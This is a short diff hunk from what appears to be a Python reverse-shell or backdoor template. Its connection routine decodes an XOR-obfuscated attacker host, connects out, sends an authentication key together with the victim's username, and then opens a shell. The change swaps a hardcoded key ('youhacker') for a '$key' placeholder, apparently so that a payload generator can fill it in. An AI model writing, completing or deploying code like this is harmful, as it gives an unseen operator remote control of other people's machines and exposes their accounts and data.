@@ -735,7 +735,7 @@ def connection():
             host = xor_strings($lhost, $hostkey).decode('utf8')
             s.connect((host,int(port)))
 
-            s.send('youhacker'.encode()+":".encode()+getpass.getuser().encode())
+            s.send('$key'.encode()+":".encode()+getpass.getuser().encode())
 
             shell()
             s.close()
